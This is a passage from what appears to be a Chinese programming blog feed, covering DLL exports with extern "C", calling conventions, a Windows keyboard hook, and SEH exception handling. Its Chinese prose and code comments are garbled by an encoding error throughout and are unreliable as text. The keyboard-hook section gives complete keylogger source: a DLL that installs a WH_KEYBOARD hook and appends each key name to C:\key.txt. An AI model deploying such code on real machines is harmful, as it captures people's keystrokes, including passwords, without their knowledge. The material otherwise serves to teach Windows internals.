<h4 id="åœ¨DLLç¼–ç¨‹ä¸­ï¼Œå¯¼å‡ºå‡½æ•°ä¸ºä»€ä¹ˆéœ€è¦extern-â€œCâ€"><a href="#åœ¨DLLç¼–ç¨‹ä¸­ï¼Œå¯¼å‡ºå‡½æ•°ä¸ºä»€ä¹ˆéœ€è¦extern-â€œCâ€" class="headerlink" title="åœ¨DLLç¼–ç¨‹ä¸­ï¼Œå¯¼å‡ºå‡½æ•°ä¸ºä»€ä¹ˆéœ€è¦extern â€œCâ€?"></a>åœ¨DLLç¼–ç¨‹ä¸­ï¼Œå¯¼å‡ºå‡½æ•°ä¸ºä»€ä¹ˆéœ€è¦extern â€œCâ€?</h4><p>ä½¿ç”¨<code>dumpbin </code> æŸ¥çœ‹dllçš„å¯¼å‡ºå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dumpbin .exports keyboarddll.dll</span><br></pre></td></tr></table></figure>

<p><img src="/posts/71edaaad/11-5.png" alt="img"></p>
<p>å¯¼å‡ºå‡½æ•°çš„ä¿®é¥°æ–¹å¼</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//å®‰è£…é’©å­</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//å¸è½½é’©å­</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨å‰é¢æ·»åŠ ä¸Š<code>extern &quot;C&quot;</code> åå†æ¬¡æŸ¥çœ‹</p>
<p><img src="/posts/71edaaad/11-6.png" alt="img"></p>
<p>ä¸€èˆ¬åœ¨ç¼–å†™dllçš„æ—¶å€™ éƒ½ä¼šä½¿ç”¨åˆ°è¿™ä¸ªextern â€œCâ€ </p>
<p>extern ä¸ºå…¨å±€å‡½æ•° ï¼Œâ€œCâ€è¡¨ç¤ºä½¿ç”¨Cç¼–è¯‘å™¨è¿›è¡Œç¼–è¯‘è€Œä¸æ˜¯C++ã€‚ C++çš„ç¼–è¯‘æ–¹å¼è€ƒè™‘äº†å‡½æ•°é‡è½½ï¼Œæ‰€ä»¥å¯¹å‡½æ•°åè¿›è¡Œäº†æ–°çš„ä¿®é¥°ï¼Œäº§ç”Ÿäº†æ‰€è°“çš„ç ´åæ€§å‘½åã€‚</p>
<p>åœ¨ç¼–è¯‘é“¾æ¥æ—¶ï¼ŒC++ä¼šæŒ‰ç…§è‡ªå·±çš„è§„åˆ™ç¯¡æ”¹å‡½æ•°çš„åç§°ï¼Œè¿™ä¸€è¿‡ç¨‹ç§°ä¸ºâ€œåå­—æ”¹ç¼–â€ã€‚è¿™ä¼šå¯¼è‡´ä¸åŒçš„ç¼–è¯‘å™¨ã€ä¸åŒçš„è¯­è¨€ä¸‹è°ƒç”¨dllå‘ç”Ÿé—®é¢˜ã€‚å› æ­¤æˆ‘ä»¬å¸Œæœ›åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶åœ¨ç¼–è¯‘æ—¶ï¼Œå¯¼å‡ºå‡½æ•°çš„åç§°ä¸è¦å‘ç”Ÿå˜åŒ–ï¼Œå¯ä»¥å†å®šä¹‰å¯¼å‡ºå‡½æ•°æ—¶åŠ ä¸Šé™å®šç¬¦ï¼šextern â€œCâ€</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">	<span class="comment">//extern &quot;C&quot; + _stdcall,å‡½æ•°å¯¼å‡ºç¬¦å·ä¸º _CreateNativeManager@0 : _+å‡½æ•°å+@+ä¼ å‚å­—èŠ‚æ•°</span></span><br><span class="line">	<span class="comment">//ç”±äº_stdcallæ˜¯è¢«è°ƒç”¨æ–¹æ¸…ç†å †æ ˆï¼Œæ‰€ä»¥å‡½æ•°ç¬¦å·é‡Œé¢åŒ…å«äº†ä¼ å‚çš„ä¿¡æ¯</span></span><br><span class="line">	_declspec(dllexport) NativeManager* _stdcall <span class="title function_">CreateNativeManager</span><span class="params">()</span>;</span><br><span class="line">	_declspec(dllexport) <span class="type">void</span> _stdcall <span class="title function_">ReleaseNativeManager</span><span class="params">()</span>;</span><br><span class="line">	_declspec(dllexport) <span class="type">void</span>(_stdcall ExSetLogHandler)(LogHandler handler);</span><br><span class="line">	<span class="comment">//extern &quot;C&quot; + _cdecl,å‡½æ•°å¯¼å‡ºç¬¦å·ä¸º ReleaseNativeManager2 : å‡½æ•°å </span></span><br><span class="line">	<span class="comment">//ç”±äº_cdeclæ˜¯è°ƒç”¨æ–¹æ¸…ç†å †æ ˆï¼Œæ‰€ä»¥åªéœ€è¦å‡½æ•°åå°±å¯ä»¥</span></span><br><span class="line">	_declspec(dllexport) <span class="type">void</span>(_cdecl ReleaseNativeManager2)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸ä½¿ç”¨externçš„æƒ…å†µä¸‹ï¼Œæ˜¯C++çš„å¯¼å‡ºæ–¹å¼ï¼Œå‡½æ•°ç¬¦å·å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="comment">//?ReleaseNativeManager1@@YGXH@Z : ?+å‡½æ•°å+@@YG+è¿”å›ç±»å‹+å‚æ•°1ç±»å‹...+@Z </span></span><br><span class="line"><span class="comment">//å¦‚æœæ˜¯_cdecl @YGå˜ä¸º@YA</span></span><br><span class="line"><span class="comment">//å¦‚æœæ²¡æœ‰å‚æ•°å³å‚æ•°ä¸ºvoid,åˆ™ä»¥Zç»“å°¾ï¼Œä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="comment">//?ReleaseNativeManager3@@YAXXZ : ?+å‡½æ•°å+@@YA+è¿”å›ç±»å‹+XZ</span></span><br><span class="line"><span class="comment">//ä»¥ä¸Š Xè¡¨ç¤º voidç±»å‹ï¼ŒHè¡¨ç¤ºintå‚æ•°ç±»å‹</span></span><br><span class="line">_declspec(dllexport) <span class="type">void</span>(_stdcall ReleaseNativeManager1)(<span class="type">int</span> num);</span><br><span class="line">_declspec(dllexport) <span class="type">void</span>(_cdecl ReleaseNativeManager3)();</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="stdcallå’Œ-cdeclçš„åŒºåˆ«"><a href="#stdcallå’Œ-cdeclçš„åŒºåˆ«" class="headerlink" title="_stdcallå’Œ_cdeclçš„åŒºåˆ«"></a>_stdcallå’Œ_cdeclçš„åŒºåˆ«</h4><p>é»˜è®¤æƒ…å†µVCä½¿ç”¨_cdecl çš„å‡½æ•°è°ƒç”¨æ–¹å¼ å¦‚æœäº§ç”Ÿçš„dllåªä¼šç»™C/C++ä½¿ç”¨ é‚£ä¹ˆæ²¡å¿…è¦å®šä¹‰ä¸º__stdcallè°ƒç”¨æ–¹å¼</p>
<p>å¦‚æœè¦ç»™Win32æ±‡ç¼–ä½¿ç”¨ é‚£ä¹ˆå¯ä»¥ä½¿ç”¨_stdcall</p>
<p>1ï¼‰è°ƒç”¨åè®®å¸¸ç”¨åœºåˆ</p>
<p>__stdcallï¼šWindows APIé»˜è®¤çš„å‡½æ•°è°ƒç”¨åè®®ã€‚</p>
<p>__cdeclï¼šC/C++é»˜è®¤çš„å‡½æ•°è°ƒç”¨åè®®ã€‚</p>
<p>2ï¼‰å‡½æ•°å‚æ•°å…¥æ ˆæ–¹å¼</p>
<p>__stdcallï¼šå‡½æ•°å‚æ•°ç”±å³å‘å·¦å…¥æ ˆã€‚</p>
<p>__cdeclï¼šå‡½æ•°å‚æ•°ç”±å³å‘å·¦å…¥æ ˆã€‚</p>
<p>3ï¼‰æ ˆå†…æ•°æ®æ¸…é™¤æ–¹å¼</p>
<p>__stdcallï¼šå‡½æ•°è°ƒç”¨ç»“æŸåç”±è¢«è°ƒç”¨å‡½æ•°æ¸…é™¤æ ˆå†…æ•°æ®ã€‚</p>
<p>__cdeclï¼šå‡½æ•°è°ƒç”¨ç»“æŸåç”±å‡½æ•°è°ƒç”¨è€…æ¸…é™¤æ ˆå†…æ•°æ®ã€‚</p>
<p>4ï¼‰Cè¯­è¨€ç¼–è¯‘å™¨å‡½æ•°åç§°ä¿®é¥°è§„åˆ™</p>
<p>__stdcallï¼šç¼–è¯‘åï¼Œå‡½æ•°åè¢«ä¿®é¥°ä¸ºâ€œ_functionname@numberâ€ã€‚</p>
<p>__cdeclï¼šç¼–è¯‘åï¼Œå‡½æ•°åè¢«ä¿®é¥°ä¸ºâ€œ_functionnameâ€ã€‚</p>
<p>5ï¼‰C++è¯­è¨€ç¼–è¯‘å™¨å‡½æ•°åç§°ä¿®é¥°è§„åˆ™</p>
<p>__stdcallï¼šç¼–è¯‘åï¼Œå‡½æ•°åè¢«ä¿®é¥°ä¸ºâ€œ?functionname@@YG******@Zâ€ã€‚</p>
<p>__cdeclï¼šç¼–è¯‘åï¼Œå‡½æ•°åè¢«ä¿®é¥°ä¸ºâ€œ?functionname@@YA******@Zâ€ã€‚</p>
<hr>
<h4 id="é”®ç›˜é’©å­ï¼ˆä¸€ï¼‰"><a href="#é”®ç›˜é’©å­ï¼ˆä¸€ï¼‰" class="headerlink" title="é”®ç›˜é’©å­ï¼ˆä¸€ï¼‰"></a>é”®ç›˜é’©å­ï¼ˆä¸€ï¼‰</h4><p>è·å–é”®å€¼ ç„¶åæŠ¥å­˜åˆ°txtä¸­ï¼ˆä»¥ä¸‹ä»£ç åœ¨æµ‹è¯•æ—¶åªèƒ½hookå½“å‰hook.exeçš„é”®ç›˜è®°å½•â€¦ï¼‰</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HHOOK hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE hinstance = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">keyProc</span><span class="params">(<span class="type">int</span> code, WPARAM wparm, LPARAM lparam)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szBuffer[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    FILE* p = <span class="literal">NULL</span>;   <span class="comment">//ä»å³ä¾§æ‰¾ å…ˆå®šä¹‰ä¸€ä¸ªæŒ‡é’ˆ</span></span><br><span class="line"></span><br><span class="line">    fopen_s(&amp;p, <span class="string">&quot;C:\\key.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (code &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam);</span><br><span class="line">    &#125;    </span><br><span class="line">   </span><br><span class="line">    GetKeyNameTextA(lparam, szBuffer, <span class="keyword">sizeof</span>(szBuffer)); <span class="comment">//è·å–é”®å€¼  </span></span><br><span class="line">    fwrite(szBuffer, <span class="built_in">strlen</span>(szBuffer), <span class="number">1</span>, p);<span class="comment">//å†™å…¥æ–‡ä»¶ä¸­</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;\r\n&quot;</span>,p);    <span class="comment">//å†™å…¥æ¢è¡Œç¬¦  </span></span><br><span class="line">    fflush(p); <span class="comment">//å®æ—¶åˆ·æ–°</span></span><br><span class="line">    fclose(p);    <span class="comment">//å…³é—­æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam); <span class="comment">//ç»™ä¸‹ä¸€ä¸ªé’©å­å¤„ç†æˆ–è€…ç»™åº”ç”¨ç¨‹åº</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//å®‰è£…é’©å­</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//å¸è½½é’©å­</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        hinstance = hModule;        <span class="comment">//åœ¨è½½å…¥æ—¶è·å–  åé¢æ— æ³•è·å–</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Referemces"><a href="#Referemces" class="headerlink" title="Referemces"></a>Referemces</h4><p>å‚è€ƒ</p>
<p><a href="https://blog.csdn.net/liminwang0311/article/details/77170932">https://blog.csdn.net/liminwang0311/article/details/77170932</a></p>
<p><a href="https://blog.csdn.net/luoyu510183/article/details/93666808">https://blog.csdn.net/luoyu510183/article/details/93666808</a></p>
<p><a href="https://blog.csdn.net/qq_31209383/article/details/50849614">https://blog.csdn.net/qq_31209383/article/details/50849614</a></p>
<p><a href="https://github.com/Powerful99/Windows-Hook-">https://github.com/Powerful99/Windows-Hook-</a></p>
<p><a href="https://www.cnblogs.com/17bdw/p/6533065.html">https://www.cnblogs.com/17bdw/p/6533065.html</a></p>
<p><a href="https://blog.csdn.net/qq_43812868/article/details/109275872">https://blog.csdn.net/qq_43812868/article/details/109275872</a></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-10_SEHå¼‚å¸¸å¤„ç†</title>
    <url>/posts/a3f022ab/</url>
    <content><![CDATA[<p>SEH ç»“æ„åŒ–å¼‚å¸¸å¤„ç†</p>
<p><img src="/posts/a3f022ab/10-1.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD32</span> &#123;</span></span><br><span class="line">    DWORD    ExceptionCode;	<span class="comment">//å¼‚å¸¸äº‹ä»¶ç </span></span><br><span class="line">    DWORD ExceptionFlags;	<span class="comment">//å¼‚å¸¸æ ‡å¿—</span></span><br><span class="line">    DWORD ExceptionRecord;	<span class="comment">//ä¸‹ä¸€ä¸ªEXCEPTION_RECORDç»“æ„çš„åœ°å€</span></span><br><span class="line">    DWORD ExceptionAddress; <span class="comment">//å¼•å‘äº†å¼‚å¸¸çš„æŒ‡ä»¤çš„åœ°å€</span></span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD32, *PEXCEPTION_RECORD32;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-2.png" alt="img"></p>
<h4 id="ä½¿ç”¨ç­›é€‰å™¨å¤„ç†å¼‚å¸¸"><a href="#ä½¿ç”¨ç­›é€‰å™¨å¤„ç†å¼‚å¸¸" class="headerlink" title="ä½¿ç”¨ç­›é€‰å™¨å¤„ç†å¼‚å¸¸"></a>ä½¿ç”¨ç­›é€‰å™¨å¤„ç†å¼‚å¸¸</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD address = <span class="number">0</span>;</span><br><span class="line">DWORD WINAPI <span class="title function_">callback</span><span class="params">(EXCEPTION_POINTERS* lpExceptionInfo)</span> &#123;</span><br><span class="line">	EXCEPTION_RECORD* record = lpExceptionInfo-&gt;ExceptionRecord;</span><br><span class="line">	CONTEXT* context = lpExceptionInfo-&gt;ContextRecord;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* str = <span class="string">&quot;å¼‚å¸¸å‘ç”Ÿçš„ä½ç½®:%08x,å¼‚å¸¸ä»£ç :%08x,å¼‚å¸¸æ ‡å¿—:%08x&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	sprintf_s(buf, <span class="keyword">sizeof</span>(buf), str, context-&gt;Eip, record-&gt;ExceptionCode, record-&gt;ExceptionFlags);</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, buf, <span class="string">&quot;aaa&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	context-&gt;Eip += address - <span class="number">3</span>;</span><br><span class="line">	<span class="comment">//return EXCEPTION_CONTINUE_SEARCH //ç»ˆæ­¢ æœ‰æç¤º</span></span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;  <span class="comment">//ç»§ç»­è¿è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	SetUnhandledExceptionFilter(callback);  <span class="comment">// ç­›é€‰å™¨   å‘ç”Ÿå¼‚å¸¸æ—¶å…ˆæ‰¾ callback  åœ¨é»˜è®¤çš„å¼‚å¸¸å¤„ç†ä¹‹å‰è¿›è¡Œç­›é€‰</span></span><br><span class="line"></span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax, offset safe</span><br><span class="line">		sub eax, offset err</span><br><span class="line">		mov address, eax</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">		<span class="type">char</span>* p = <span class="number">0x0</span>;</span><br><span class="line">	err:	*p = <span class="number">20</span>; <span class="comment">//ä¼šè§¦å‘ç©ºæŒ‡é’ˆå¼‚å¸¸ c</span></span><br><span class="line">			MessageBoxA(<span class="number">0</span>, <span class="string">&quot;ä¸å¯ä»¥æ‰§è¡Œ&quot;</span>, <span class="string">&quot;ä¸å¯ä»¥æ‰§è¡Œ&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//_asm int 3</span></span><br><span class="line"></span><br><span class="line">	safe:</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;è·³åˆ°å®‰å…¨åœ°æ–¹æ‰§ç»§ç»­è¡Œ&quot;</span>, <span class="string">&quot;è·³åˆ°å®‰å…¨åœ°æ–¹æ‰§ç»§ç»­è¡Œ&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-3.png" alt="img"></p>
<p><img src="/posts/a3f022ab/10-4.png" alt="img"></p>
<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fn</span><span class="params">()</span> &#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;å®‰å…¨åœ°æ–¹æ‰§è¡Œ&quot;</span>, <span class="string">&quot;å®‰å…¨åœ°æ–¹æ‰§è¡Œ&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD address = <span class="number">0</span>;</span><br><span class="line">DWORD WINAPI <span class="title function_">callback</span><span class="params">(EXCEPTION_POINTERS* lpExceptionInfo)</span> &#123;</span><br><span class="line">	EXCEPTION_RECORD* record = lpExceptionInfo-&gt;ExceptionRecord;</span><br><span class="line">	CONTEXT* context = lpExceptionInfo-&gt;ContextRecord;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* str = <span class="string">&quot;å¼‚å¸¸å‘ç”Ÿçš„ä½ç½®:%08x,å¼‚å¸¸ä»£ç :%08x,å¼‚å¸¸æ ‡å¿—:%08x&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	sprintf_s(buf,<span class="keyword">sizeof</span>(buf),str,context-&gt;Eip, record-&gt;ExceptionCode, record-&gt;ExceptionFlags);</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, buf, <span class="string">&quot;aaa&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	context-&gt;Eip =fn;</span><br><span class="line">	<span class="comment">//return EXCEPTION_CONTINUE_SEARCH //ç»ˆæ­¢ æœ‰æç¤º</span></span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;  <span class="comment">//ç»§ç»­è¿è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	SetUnhandledExceptionFilter(callback);  <span class="comment">// ç­›é€‰å™¨   å‘ç”Ÿå¼‚å¸¸æ—¶å…ˆæ‰¾ callback  åœ¨é»˜è®¤çš„å¼‚å¸¸å¤„ç†ä¹‹å‰è¿›è¡Œç­›é€‰</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//_asm &#123;</span></span><br><span class="line">	<span class="comment">//	mov eax, offset safe</span></span><br><span class="line">	<span class="comment">//	sub eax, offset err</span></span><br><span class="line">	<span class="comment">//	mov address, eax</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//	char* p = 0x0;</span></span><br><span class="line"><span class="comment">//err:	*p = 20; //ä¼šè§¦å‘ç©ºæŒ‡é’ˆå¼‚å¸¸ c</span></span><br><span class="line"><span class="comment">//		MessageBoxA(0, &quot;ä¸å¯ä»¥æ‰§è¡Œ&quot;, &quot;ä¸å¯ä»¥æ‰§è¡Œ&quot;, 0);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">	_asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;ä¸å¯ä»¥æ‰§è¡Œ&quot;</span>, <span class="string">&quot;ä¸å¯ä»¥æ‰§è¡Œ&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//safe:</span></span><br><span class="line"><span class="comment">//	MessageBoxA(0, &quot;è·³åˆ°å®‰å…¨åœ°æ–¹æ‰§ç»§ç»­è¡Œ&quot;, &quot;è·³åˆ°å®‰å…¨åœ°æ–¹æ‰§ç»§ç»­è¡Œ&quot;, 0);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-5.png" alt="img"></p>
<hr>
<h4 id="TIBçº¿ç¨‹ä¿¡æ¯å—"><a href="#TIBçº¿ç¨‹ä¿¡æ¯å—" class="headerlink" title="TIBçº¿ç¨‹ä¿¡æ¯å—"></a>TIBçº¿ç¨‹ä¿¡æ¯å—</h4><p>TIBï¼ˆThread Information Block çº¿ç¨‹ä¿¡æ¯å—ï¼‰ æ˜¯ä¿å­˜çº¿ç¨‹åŸºæœ¬ä¿¡æ¯çš„æ•°æ®ç»“æ„ï¼Œuser modeä¸‹ä½äºTEBï¼ˆThread Enviroment Blockçº¿ç¨‹ç¯å¢ƒå—ï¼‰çš„å¤´éƒ¨ï¼ŒTEBæ˜¯æ“ä½œç³»ç»Ÿä¸ºäº†ä¿å­˜æ¯ä¸ªçº¿ç¨‹çš„ç§æœ‰æ•°æ®è€Œåˆ›å»ºçš„ï¼Œæ‰€ä»¥æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰TEBã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//çº¿ç¨‹ä¿¡æ¯å— ä¿å­˜çº¿ç¨‹çš„ä¸€äº›å±æ€§</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">//sehé“¾å…¥å£</span></span><br><span class="line">    PVOID StackBase;	<span class="comment">//æ ˆåŸºå€</span></span><br><span class="line">    PVOID StackLimit;<span class="comment">//æ ˆå¤§å°</span></span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span>	<span class="comment">//æŒ‡å‘TIBç»“æ„è‡ªèº«</span></span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>* <span class="title">Next</span>;</span><span class="comment">//æŒ‡å‘ä¸‹ä¸€ä¸ª_EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;     <span class="comment">//å¼‚å¸¸å¤„ç†å›è°ƒå‡½æ•°åœ°å€</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>

<p>TIBæ°¸è¿œæ”¾åœ¨FSæ®µé€‰æ‹©å™¨æŒ‡å‘çš„æ•°æ®æ®µçš„0åç§»å¤„ FS:[0]ï¼ˆx86å¹³å°çš„user modeä¸Šï¼Œfs:[0]æ€»æ˜¯æŒ‡å‘TEBï¼‰</p>
<p>å‚è€ƒ <a href="https://bbs.pediy.com/thread-273332.htm">https://bbs.pediy.com/thread-273332.htm</a></p>
<hr>
<h4 id="SEHå®‰è£…ä¸å¸è½½"><a href="#SEHå®‰è£…ä¸å¸è½½" class="headerlink" title="SEHå®‰è£…ä¸å¸è½½"></a>SEHå®‰è£…ä¸å¸è½½</h4><p>SEHæœ¬è´¨å°±æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠæˆ‘ä»¬å†™å¥½çš„ä¸€ä¸ª_EXCEPTION_REGISTRATION_RECORDç»“æ„æ’å…¥åˆ°é“¾è¡¨å¤´å°±è¡Œã€‚é¦–å…ˆpushæŒ‡å‘æˆ‘ä»¬handlerçš„åœ°å€ï¼Œç„¶å<code>push fs:[0]</code>ï¼Œæ­¤æ—¶å°±æˆåŠŸçš„åˆ›é€ äº†ä¸€ä¸ª<code>_EXCEPTION_REGISTRATION_RECORD</code>ã€‚æœ€å<code>mov fs:[0],esp</code>ï¼Œå°±æˆåŠŸçš„ä¿®æ”¹äº†æˆ‘ä»¬çš„TEBï¼Œç›¸å½“äºæ’å…¥äº†ä¸€ä¸ªæ–°çš„èŠ‚ç‚¹ã€‚</p>
<p><img src="/posts/a3f022ab/10-6.png" alt="img"></p>
